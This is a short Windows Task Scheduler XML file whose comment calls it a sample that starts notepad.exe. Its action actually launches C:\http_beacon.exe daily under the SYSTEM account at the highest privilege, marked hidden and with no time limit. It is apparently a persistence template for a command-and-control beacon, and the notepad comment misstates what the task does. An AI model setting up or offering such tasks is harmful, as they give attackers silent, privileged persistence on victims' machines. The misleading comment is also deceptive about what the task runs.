```
<?xml version="1.0" ?>
<!--
This sample schedules a task to start notepad.exe at a specific time.
-->
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>AuthorName</Author>
        <Description>Task starts after at a specified time.</Description>
    </RegistrationInfo>
    <Triggers>
        <CalendarTrigger>
            <StartBoundary>2026-08-25T07:00:00</StartBoundary>
            <Enabled>true</Enabled>
            <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
        </CalendarTrigger>
    </Triggers>
    <Principals>
        <Principal id="Author">
            <UserId>S-1-5-18</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <Enabled>true</Enabled>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <AllowHardTerminate>true</AllowHardTerminate>
        <Hidden>true</Hidden>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>C:\http_beacon.exe</Command>
        </Exec>
    </Actions>
</Task>
```